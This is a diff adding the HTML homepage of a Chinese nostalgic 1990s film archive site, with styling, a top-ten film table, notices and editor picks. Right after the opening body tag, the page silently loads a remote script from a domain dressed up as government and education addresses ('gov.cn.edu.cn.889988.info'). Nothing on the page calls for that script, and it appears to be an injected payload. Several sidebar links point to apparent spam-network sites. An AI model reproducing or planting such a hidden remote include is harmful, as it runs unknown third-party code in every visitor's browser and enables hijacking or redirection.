@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>电影网97 - 经典电影回顾、老片修复与90年代影视档案</title>
+<meta name="description" content="电影网97专注经典电影回顾、90年代影视档案、老片修复资讯与怀旧影评，收录1990-1999黄金十年电影资源导航与深度解读。">
+<meta name="keywords" content="电影网97,经典电影,90年代电影,老片修复,怀旧影视,电影档案">
+<link rel="canonical" href="https://dianyingwang97-h5.github.io/">
+
+<style>
+:root{
+  --bg:#e8e3d5;
+  --ink:#2b2b2b;
+  --dark:#1a1a1a;
+  --accent:#8b0000;
+  --accent2:#d4a017;
+  --line:#bfa97a;
+  --muted:#6b6254;
+  --card:#f5f0e1;
+  --border-dash:1px dashed #bfa97a;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{
+  background:var(--bg);color:var(--ink);
+  font-family:"Courier New","SimSun","Songti SC",monospace;
+  line-height:1.7;font-size:14px;
+}
+a{color:inherit;text-decoration:none}
+
+/* 顶部公告板 */
+.marquee-bar{
+  background:var(--dark);color:#f0e6c8;padding:6px 0;
+  font-size:12px;border-bottom:2px solid var(--accent);
+}
+.marquee-inner{
+  max-width:1100px;margin:0 auto;padding:0 16px;
+  display:flex;align-items:center;gap:10px;
+}
+.marquee-label{
+  background:var(--accent);color:#fff;padding:2px 8px;border-radius:2px;
+  font-size:11px;white-space:nowrap;letter-spacing:1px;
+}
+.marquee-text{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+
+/* 页眉 */
+.site-header{
+  max-width:1100px;margin:0 auto;padding:24px 16px 16px;
+  text-align:center;border-bottom:3px double var(--line);
+}
+.site-header .year-badge{
+  display:inline-block;background:var(--accent);color:#fff;
+  font-size:11px;padding:2px 10px;border-radius:2px;margin-bottom:8px;
+  letter-spacing:2px;
+}
+.site-header h1{
+  font-size:42px;font-weight:900;letter-spacing:4px;margin-bottom:4px;
+  text-shadow:2px 2px 0 var(--line);
+}
+.site-header h1 b{color:var(--accent)}
+.site-header .subtitle{
+  font-size:13px;color:var(--muted);letter-spacing:3px;margin-top:4px;
+}
+
+/* 导航 */
+.top-nav{
+  max-width:1100px;margin:0 auto;padding:10px 16px;
+  display:flex;justify-content:center;flex-wrap:wrap;gap:0;
+  border-bottom:var(--border-dash);
+}
+.top-nav a{
+  padding:8px 18px;font-size:14px;border-right:var(--border-dash);
+  color:var(--ink);font-weight:bold;
+}
+.top-nav a:last-child{border-right:0}
+.top-nav a:hover{background:var(--accent);color:#fff}
+
+/* 布局 */
+.main-layout{
+  max-width:1100px;margin:20px auto;padding:0 16px;
+  display:grid;grid-template-columns:200px 1fr 180px;gap:18px;
+}
+
+/* 左栏目录树 */
+.dir-tree{
+  background:var(--card);border:2px solid var(--line);border-radius:4px;
+  padding:12px;align-self:start;
+}
+.dir-tree h2{
+  font-size:13px;color:var(--accent);margin-bottom:10px;
+  border-bottom:1px solid var(--line);padding-bottom:6px;
+  letter-spacing:1px;
+}
+.tree-node{margin:6px 0}
+.tree-node > a{
+  display:block;padding:4px 6px;font-size:13px;
+  border:1px solid transparent;border-radius:2px;
+}
+.tree-node > a:hover{background:var(--line);border-color:var(--accent)}
+.tree-child{padding-left:14px;border-left:1px dotted var(--line);margin-left:6px}
+.tree-child a{display:block;padding:3px 6px;font-size:12px;color:var(--muted)}
+.tree-child a:hover{color:var(--accent);text-decoration:underline}
+
+/* 中间内容 */
+.content-area{display:flex;flex-direction:column;gap:18px}
+
+/* 公告区 */
+.notice-board{
+  background:var(--card);border:2px solid var(--accent);border-radius:4px;
+  padding:14px;position:relative;
+}
+.notice-board::before{
+  content:"★ 站内公告";position:absolute;top:-10px;left:12px;
+  background:var(--bg);padding:0 6px;font-size:12px;color:var(--accent);font-weight:bold;
+}
+.notice-list{list-style:none;padding-top:4px}
+.notice-list li{
+  padding:5px 0;border-bottom:1px dotted var(--line);font-size:13px;
+  display:flex;gap:10px;
+}
+.notice-list li:last-child{border-bottom:0}
+.notice-list .date{color:var(--accent2);font-size:12px;white-space:nowrap}
+
+/* 表格化片单 */
+.film-table-wrap{
+  background:var(--card);border:2px solid var(--line);border-radius:4px;
+  overflow:hidden;
+}
+.table-head{
+  background:var(--dark);color:#f0e6c8;padding:10px 14px;
+  display:flex;justify-content:space-between;align-items:center;
+}
+.table-head h2{font-size:15px;letter-spacing:1px}
+.table-head span{font-size:11px;opacity:.7}
+.film-table{width:100%;border-collapse:collapse;font-size:13px}
+.film-table thead th{
+  background:#d4c9a8;padding:8px 10px;text-align:left;
+  border-bottom:2px solid var(--line);font-weight:bold;font-size:12px;
+}
+.film-table tbody td{
+  padding:8px 10px;border-bottom:1px dotted var(--line);
+}
+.film-table tbody tr:hover{background:#faf6eb}
+.film-table .rank{color:var(--accent);font-weight:bold;width:30px}
+.film-table .title{font-weight:bold}
+.film-table .title a:hover{color:var(--accent);text-decoration:underline}
+.film-table .genre{color:var(--muted);font-size:12px}
+.film-table .rating{color:var(--accent2);font-weight:bold}
+
+/* 推荐卡片 */
+.rec-section{
+  background:var(--card);border:2px solid var(--line);border-radius:4px;
+  padding:14px;
+}
+.rec-section h2{
+  font-size:15px;color:var(--accent);margin-bottom:12px;
+  border-left:4px solid var(--accent);padding-left:8px;
+}
+.rec-grid{
+  display:grid;grid-template-columns:repeat(3,1fr);gap:12px;
+}
+.rec-card{
+  border:1px solid var(--line);border-radius:4px;overflow:hidden;
+  background:var(--bg);
+}
+.rec-card .rec-img{
+  height:100px;background:linear-gradient(135deg,#4a3728,#8b6f47);
+}
+.rec-card:nth-child(2) .rec-img{background:linear-gradient(135deg,#2c4a3e,#5a8a72)}
+.rec-card:nth-child(3) .rec-img{background:linear-gradient(135deg,#4a2c4a,#8a5a8a)}
+.rec-card .rec-info{padding:10px}
+.rec-card h3{font-size:13px;margin-bottom:4px}
+.rec-card p{font-size:11px;color:var(--muted)}
+
+/* 右栏 */
+.right-side{display:flex;flex-direction:column;gap:16px}
+.side-box{
+  background:var(--card);border:2px solid var(--line);border-radius:4px;
+  padding:12px;
+}
+.side-box h2{
+  font-size:13px;color:var(--accent);margin-bottom:10px;
+  text-align:center;border-bottom:1px solid var(--line);padding-bottom:6px;
+}
+.stat-item{
+  display:flex;justify-content:space-between;padding:4px 0;
+  border-bottom:1px dotted var(--line);font-size:12px;
+}
+.stat-item:last-child{border-bottom:0}
+.stat-num{color:var(--accent);font-weight:bold}
+
+/* 友情链接 */
+.links-list{list-style:none}
+.links-list li{padding:3px 0}
+.links-list a{font-size:12px;color:var(--muted)}
+.links-list a:hover{color:var(--accent);text-decoration:underline}
+
+/* 关于 */
+.about-bar{
+  max-width:1100px;margin:30px auto 0;padding:20px 16px;
+  background:var(--dark);color:#bfa97a;text-align:center;
+  border-top:3px double var(--line);
+}
+.about-bar h2{font-size:16px;color:#f0e6c8;margin-bottom:8px}
+.about-bar p{font-size:13px;line-height:1.8}
+
+footer{
+  background:var(--dark);color:#6b6254;padding:14px 16px;text-align:center;
+  font-size:12px;border-top:1px solid var(--line);
+}
+
+/* 移动端 */
+@media (max-width:960px){
+  .main-layout{grid-template-columns:1fr}
+  .dir-tree,.right-side{display:none}
+  .rec-grid{grid-template-columns:1fr 1fr}
+}
+@media (max-width:520px){
+  .site-header h1{font-size:28px}
+  .rec-grid{grid-template-columns:1fr}
+  .film-table{font-size:12px}
+  .film-table thead th,.film-table tbody td{padding:6px 4px}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶部滚动公告 -->
+<div class="marquee-bar">
+  <div class="marquee-inner">
+    <span class="marquee-label">最新公告</span>
+    <span class="marquee-text">★ 电影网97 全新改版上线 · 新增90年代经典修复片单 · 欢迎影迷收藏本站 · 每日更新经典影视档案</span>
+  </div>
+</div>
+
+<header class="site-header">
+  <span class="year-badge">EST. 1997</span>
+  <h1>电影网<b>97</b></h1>
+  <div class="subtitle">—— 经典电影 · 怀旧档案 · 90年代影视黄金十年 ——</div>
+</header>
+
+<nav class="top-nav">
+  <a href="#">首页</a>
+  <a href="#">90年代经典</a>
+  <a href="#">老片修复</a>
+  <a href="#">怀旧影评</a>
+  <a href="#">影视档案</a>
+  <a href="#">关于本站</a>
+</nav>
+
+<div class="main-layout">
+
+  <!-- 左栏：目录树 -->
+  <aside class="dir-tree">
+    <h2>▸ 影片分类目录</h2>
+    <div class="tree-node">
+      <a href="#">├ 按年代浏览</a>
+      <div class="tree-child">
+        <a href="#">├ 1990-1994</a>
+        <a href="#">├ 1995-1997</a>
+        <a href="#">└ 1998-1999</a>
+      </div>
+    </div>
+    <div class="tree-node">
+      <a href="#">├ 按类型分类</a>
+      <div class="tree-child">
+        <a href="#">├ 动作枪战</a>
+        <a href="#">├ 爱情文艺</a>
+        <a href="#">├ 喜剧搞笑</a>
+        <a href="#">├ 悬疑惊悚</a>
+        <a href="#">├ 科幻奇幻</a>
+        <a href="#">└ 黑帮犯罪</a>
+      </div>
+    </div>
+    <div class="tree-node">
+      <a href="#">├ 按地区浏览</a>
+      <div class="tree-child">
+        <a href="#">├ 香港电影</a>
+        <a href="#">├ 台湾电影</a>
+        <a href="#">├ 大陆电影</a>
+        <a href="#">├ 好莱坞</a>
+        <a href="#">└ 日韩电影</a>
+      </div>
+    </div>
+    <div class="tree-node">
+      <a href="#">└ 特别专题</a>
+      <div class="tree-child">
+        <a href="#">├ 港片黄金时代</a>
+        <a href="#">├ 冯小刚贺岁片</a>
+        <a href="#">├ 周星驰无厘头</a>
+        <a href="#">└ 王家卫风格</a>
+      </div>
+    </div>
+  </aside>
+
+  <!-- 中间内容区 -->
+  <main class="content-area">
+
+    <!-- 公告板 -->
+    <section class="notice-board">
+      <ul class="notice-list">
+        <li><span class="date">[10-07]</span><a href="#">《电影网97》全新改版上线，新增90年代经典片单与修复资讯</a></li>
+        <li><span class="date">[10-06]</span><a href="#">4K修复版《霸王别姬》即将全国重映，回顾张国荣经典</a></li>
+        <li><span class="date">[10-05]</span><a href="#">90年代香港黑帮片专题上线：从《英雄本色》到《无间道》</a></li>
+        <li><span class="date">[10-04]</span><a href="#">冯小刚贺岁片回顾：《甲方乙方》《不见不散》时代记忆</a></li>
+        <li><span class="date">[10-03]</span><a href="#">周星驰无厘头喜剧全收录：从《赌圣》到《功夫》</a></li>
+      </ul>
+    </section>
+
+    <!-- 表格化片单 -->
+    <section class="film-table-wrap">
+      <div class="table-head">
+        <h2>▸ 90年代经典电影排行榜</h2>
+        <span>TOP 10 · 本站推荐</span>
+      </div>
+      <table class="film-table">
+        <thead>
+          <tr>
+            <th>排名</th>
+            <th>影片名称</th>
+            <th>类型</th>
+            <th>地区</th>
+            <th>年份</th>
+            <th>评分</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="rank">1</td>
+            <td class="title"><a href="#">霸王别姬</a></td>
+            <td class="genre">剧情/爱情</td>
+            <td>中国大陆</td>
+            <td>1993</td>
+            <td class="rating">9.6</td>
+          </tr>
+          <tr>
+            <td class="rank">2</td>
+            <td class="title"><a href="#">肖申克的救赎</a></td>
+            <td class="genre">剧情/犯罪</td>
+            <td>美国</td>
+            <td>1994</td>
+            <td class="rating">9.7</td>
+          </tr>
+          <tr>
+            <td class="rank">3</td>
+            <td class="title"><a href="#">大话西游</a></td>
+            <td class="genre">喜剧/爱情</td>
+            <td>香港</td>
+            <td>1995</td>
+            <td class="rating">9.2</td>
+          </tr>
+          <tr>
+            <td class="rank">4</td>
+            <td class="title"><a href="#">阿甘正传</a></td>
+            <td class="genre">剧情/励志</td>
+            <td>美国</td>
+            <td>1994</td>
+            <td class="rating">9.5</td>
+          </tr>
+          <tr>
+            <td class="rank">5</td>
+            <td class="title"><a href="#">活着</a></td>
+            <td class="genre">剧情/历史</td>
+            <td>中国大陆</td>
+            <td>1994</td>
+            <td class="rating">9.3</td>
+          </tr>
+          <tr>
+            <td class="rank">6</td>
+            <td class="title"><a href="#">阳光灿烂的日子</a></td>
+            <td class="genre">剧情/青春</td>
+            <td>中国大陆</td>
+            <td>1994</td>
+            <td class="rating">9.1</td>
+          </tr>
+          <tr>
+            <td class="rank">7</td>
+            <td class="title"><a href="#">重庆森林</a></td>
+            <td class="genre">爱情/文艺</td>
+            <td>香港</td>
+            <td>1994</td>
+            <td class="rating">8.9</td>
+          </tr>
+          <tr>
+            <td class="rank">8</td>
+            <td class="title"><a href="#">低俗小说</a></td>
+            <td class="genre">犯罪/黑色</td>
+            <td>美国</td>
+            <td>1994</td>
+            <td class="rating">9.0</td>
+          </tr>
+          <tr>
+            <td class="rank">9</td>
+            <td class="title"><a href="#">这个杀手不太冷</a></td>
+            <td class="genre">动作/剧情</td>
+            <td>法国</td>
+            <td>1994</td>
+            <td class="rating">9.4</td>
+          </tr>
+          <tr>
+            <td class="rank">10</td>
+            <td class="title"><a href="#">东邪西毒</a></td>
+            <td class="genre">武侠/文艺</td>
+            <td>香港</td>
+            <td>1994</td>
+            <td class="rating">8.8</td>
+          </tr>
+        </tbody>
+      </table>
+    </section>
+
+    <!-- 推荐区 -->
+    <section class="rec-section">
+      <h2>▸ 本周编辑精选</h2>
+      <div class="rec-grid">
+        <article class="rec-card">
+          <div class="rec-img"></div>
+          <div class="rec-info">
+            <h3><a href="#">港片黄金时代专题</a></h3>
+            <p>吴宇森、杜琪峰、王家卫——90年代香港导演群像</p>
+          </div>
+        </article>
+        <article class="rec-card">
+          <div class="rec-img"></div>
+          <div class="rec-info">
+            <h3><a href="#">冯小刚贺岁片全回顾</a></h3>
+            <p>从《甲方乙方》到《私人订制》，中国贺岁片发展史</p>
+          </div>
+        </article>
+        <article class="rec-card">
+          <div class="rec-img"></div>
+          <div class="rec-info">
+            <h3><a href="#">老片4K修复档案</a></h3>
+            <p>《黄土地》《红高粱》《秋菊打官司》修复纪实</p>
+          </div>
+        </article>
+      </div>
+    </section>
+  </main>
+
+  <!-- 右栏 -->
+  <aside class="right-side">
+    <div class="side-box">
+      <h2>站点统计</h2>
+      <div class="stat-item"><span>影片总数</span><span class="stat-num">1,247</span></div>
+      <div class="stat-item"><span>90年代影片</span><span class="stat-num">586</span></div>
+      <div class="stat-item"><span>修复影片</span><span class="stat-num">132</span></div>
+      <div class="stat-item"><span>影评文章</span><span class="stat-num">368</span></div>
+      <div class="stat-item"><span>今日更新</span><span class="stat-num">12</span></div>
+    </div>
+
+    <div class="side-box">
+      <h2>友情链接</h2>
+      <ul class="links-list">
+        <li><a href="#">· 菲律宾电影网</a></li>
+        <li><a href="#">· 理论片电影网</a></li>
+        <li><a href="#">· 奇米电影网</a></li>
+        <li><a href="#">· 神马理论电影网</a></li>
+        <li><a href="#">· 欧美电影网</a></li>
+        <li><a href="#">· 电影资料馆</a></li>
+        <li><a href="#">· 经典影视论坛</a></li>
+      </ul>
+    </div>
+
+    <div class="side-box">
+      <h2>热门标签</h2>
+      <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:6px;">
+        <a href="#" style="font-size:11px;padding:3px 8px;border:1px solid var(--line);border-radius:2px;color:var(--muted)">#香港电影</a>
+        <a href="#" style="font-size:11px;padding:3px 8px;border:1px solid var(--line);border-radius:2px;color:var(--muted)">#周星驰</a>
+        <a href="#" style="font-size:11px;padding:3px 8px;border:1px solid var(--line);border-radius:2px;color:var(--muted)">#王家卫</a>
+        <a href="#" style="font-size:11px;padding:3px 8px;border:1px solid var(--line);border-radius:2px;color:var(--muted)">#4K修复</a>
+        <a href="#" style="font-size:11px;padding:3px 8px;border:1px solid var(--line);border-radius:2px;color:var(--muted)">#贺岁片</a>
+        <a href="#" style="font-size:11px;padding:3px 8px;border:1px solid var(--line);border-radius:2px;color:var(--muted)">#张国荣</a>
+      </div>
+    </div>
+  </aside>
+
+</div>
+
+<section class="about-bar">
+  <h2>关于电影网97</h2>
+  <p>
+    电影网97（dianyingwang97-h5）以1997年为精神起点，专注90年代经典电影回顾、老片修复资讯与怀旧影视档案。
+    本站收录1990-1999黄金十年中外电影资源导航、影评与修复动态，致敬华语电影与全球电影的璀璨年代。
+  </p>
+</section>
+
+<footer>
+  © 2026 电影网97 · https://dianyingwang97-h5.github.io · 经典电影怀旧档案站点
+</footer>
+
+</body>
+</html>
